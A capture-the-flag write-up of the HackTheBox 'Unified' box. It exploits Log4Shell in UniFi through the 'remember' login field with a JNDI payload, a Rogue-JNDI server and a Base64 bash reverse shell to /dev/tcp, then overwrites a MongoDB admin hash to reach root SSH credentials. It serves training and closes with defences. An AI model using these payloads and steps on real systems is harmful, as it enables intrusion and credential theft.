# Unified

**Platform:** HackTheBox -- Starting Point Tier 2
**OS:** Linux
**Difficulty:** Medium
**Date:** 2026-07-17

---

## Summary

Linux box running UniFi Network Controller. Version enumeration via the `/status` API endpoint reveals a version vulnerable to Log4Shell (CVE-2021-44228). The `remember` parameter in the login POST request is logged unsanitised, allowing JNDI injection. A rogue LDAP server delivers a Base64 encoded reverse shell payload, giving a shell as `unifi`. MongoDB is running locally storing UniFi admin credentials as SHA-512 hashes. The administrator hash is replaced with a known hash, granting access to the UniFi dashboard where SSH root credentials are stored in plaintext.

---

## What We Didn't Know Before vs What We Know Now

| Before | After |
|--------|-------|
| Didn't know the `remember` field was a Log4Shell injection point | UniFi logs the `remember` parameter unsanitised -- any logged field is a potential injection point |
| Didn't know tcpdump could confirm JNDI execution before full exploitation | tcpdump on port 389 confirms outbound LDAP connection from target, proving payload fired |
| Didn't know brace expansion syntax for avoiding spaces in payloads | `{base64,-d}` is equivalent to `base64 -d` but without spaces -- spaces inside command strings break piped payloads |
| Didn't know UniFi stores credentials in MongoDB under the `ace` database | UniFi default database is `ace`, admin credentials in the `admin` collection |

---

## Recon

```bash
nmap -sV -sC -p- --min-rate 5000 <ip>
```

**Open ports:**
- 22 -- SSH
- 6789 -- TCP (ibm-db2-admin)
- 8080 -- HTTP (Apache)
- 8443 -- HTTPS (UniFi Network Controller)
- 8843 -- HTTPS
- 8880 -- HTTP

---

## Enumeration

### Version Identification

```bash
curl -k https://<ip>:8443/status
```

**Flags:**
- `-k` -- skip SSL certificate verification (UniFi uses a self-signed cert)

Returns JSON with UniFi version number.

Googling `UniFi <version> CVE` reveals the version is vulnerable to **Log4Shell (CVE-2021-44228)**.

### Web UI

Navigating to `https://<ip>:8443/manage` loads the UniFi login page. Default credentials do not work.

---

## Foothold

### Confirming Log4Shell Injection

Enable FoxyProxy in Firefox and intercept the login POST request in Burp Suite.

The POST body contains a `remember` parameter. UniFi logs this field unsanitised, making it a Log4Shell injection point.

Replace the `remember` value with a JNDI test payload:

```
${jndi:ldap://<tun0_ip>:389/test}
```

Response returns `"msg":"api.err.InvalidPayload"` -- confirms the payload is being processed.

### Confirming Outbound LDAP Connection

```bash
sudo tcpdump -i tun0 port 389
```

**Flags:**
- `sudo` -- root required for packet capture
- `-i tun0` -- listen on HTB VPN interface
- `port 389` -- filter to LDAP port only

Trigger the payload again -- tcpdump captures an incoming connection from the target on port 389, confirming the JNDI lookup is firing.

### Setting Up Rogue LDAP Server

Clone and build Rogue-JNDI:

```bash
git clone https://github.com/veracode-research/rogue-jndi
cd rogue-jndi
mvn package -q
```

### Generating the Payload

Base64 encode the reverse shell to avoid special character issues:

```bash
echo 'bash -i >&/dev/tcp/<tun0_ip>/4444 0>&1' | base64 -w 0
```

**Flags:**
- `-w 0` -- disable line wrapping -- outputs Base64 as a single unbroken string

### Starting the Listener

```bash
nc -lvnp 4444
```

**Flags:**
- `-l` -- listen mode
- `-v` -- verbose
- `-n` -- no DNS resolution
- `-p` -- port to listen on

### Running Rogue-JNDI

```bash
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,<BASE64>}|{base64,-d}|{bash,-i}" --hostname "<tun0_ip>"
```

**Flags:**
- `-jar` -- run a compiled Java `.jar` file
- `--command` -- payload to deliver when LDAP connection is received
- `--hostname` -- attacker IP embedded in the LDAP response

**Important:** No spaces anywhere inside the command string. `{base64,-d}` not `{base64, -d}`. Spaces inside brace expansion break the piped command chain.

Trigger the payload in Burp Suite by sending the JNDI string in the `remember` field again. Rogue-JNDI confirms `"Sending LDAP ResourceRef result for o=tomcat"` and netcat catches the reverse shell.

### User Flag

Shell obtained as `unifi@unified`.

```bash
cd /home/michael
cat user.txt
```

---

## Privilege Escalation

### Locating MongoDB

Since UniFi runs MongoDB as its backend, check if it's running:

```bash
ps aux | grep mongo
```

**Flags:**
- `a` -- show processes from all users
- `u` -- show process owner and resource usage
- `x` -- include processes not attached to a terminal

MongoDB is running on non-standard port **27117**.

### Dumping Admin Credentials

UniFi stores credentials in the `ace` database under the `admin` collection:

```bash
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
```

**Flags:**
- `--port 27117` -- non-standard MongoDB port
- `ace` -- UniFi default database name
- `--eval` -- execute JavaScript expression and exit without entering interactive shell

Returns all admin documents including ObjectId and `x_shadow` field containing the password hash. Hash identified as **SHA-512** by the `$6$` prefix.

### Replacing the Hash

SHA-512 is not practically crackable -- replace it with a hash of a known password instead.

Generate a new SHA-512 hash:

```bash
mkpasswd -m sha-512 Password123
```

Replace the administrator's hash using their ObjectId:

```bash
mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("<objectid>")},{$set:{"x_shadow":"<new_hash>"}})'
```

### Accessing UniFi Dashboard

Log into `https://<ip>:8443/manage` as `administrator` with `Password123`.

Navigate to **Settings > Site > SSH Authentication** -- root SSH credentials stored in plaintext.

### Root Shell

```bash
ssh root@<ip>
```

```bash
cat /root/root.txt
```

---

## Tools Used

- nmap
- curl
- Burp Suite + FoxyProxy
- tcpdump
- Rogue-JNDI (veracode-research/rogue-jndi)
- netcat
- mongo
- mkpasswd
- ssh

---

## Key Takeaways

**What would have stopped this:**
- UniFi should have been patched -- Log4Shell was a critical widely publicised vulnerability
- The `remember` field (and all logged fields) should have input sanitisation stripping JNDI lookup strings
- MongoDB should not be accessible from a low-privilege shell -- should be restricted to root or the application service account only
- SSH root credentials should never be stored in plaintext in a management dashboard

**Research methodology applied:**
- Version identified via `/status` API endpoint
- CVE found via Google search `UniFi <version> CVE`
- Exploitation steps found via HackTricks and CVE research
- This is the standard research workflow: find version, find CVE, research exploitation, apply

**Hash operations:**
- `$6$` prefix identifies SHA-512 -- not practically crackable
- When you have database write access, replace the hash rather than crack it
- Generate a known hash with `mkpasswd -m sha-512 <password>`, substitute via update query

**Syntax gotcha:**
- Brace expansion `{base64,-d}` avoids spaces in piped command strings
- No spaces after commas inside brace expansion -- `{base64,-d}` not `{base64, -d}`
- A single space breaks the entire payload chain silently